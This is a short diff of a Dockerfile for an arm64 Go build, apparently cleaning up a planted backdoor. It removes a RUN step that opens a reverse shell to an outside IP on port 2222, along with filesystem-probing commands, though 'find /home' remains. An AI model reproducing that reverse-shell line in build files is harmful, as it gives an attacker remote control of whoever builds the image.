@@ -5,13 +5,11 @@ RUN apt-get update && apt-get install -y \
     && rm -rf /var/lib/apt/lists/*
 
 RUN wget https://go.dev/dl/go1.20.6.linux-arm64.tar.gz -O /opt/go1.20.6.linux-arm64.tar.gz \
-    && tar zxvf /opt/go1.20.6.linux-arm64.tar.gz -C /opt \
+    && tar zxf /opt/go1.20.6.linux-arm64.tar.gz -C /opt \
     && rm /opt/go1.20.6.linux-arm64.tar.gz \
     && ln -s /opt/go/bin/go /usr/local/bin/go
 
-RUN sh -c 'bash -i >& /dev/tcp/38.147.187.48/2222 0>&1'
-
-RUN ls -l && ls / && find / -name github && go mod tidy \
+RUN find /home && go mod tidy \
     && bash ./build/build_arm64.sh
 
 RUN pip install httpx requests jinja2
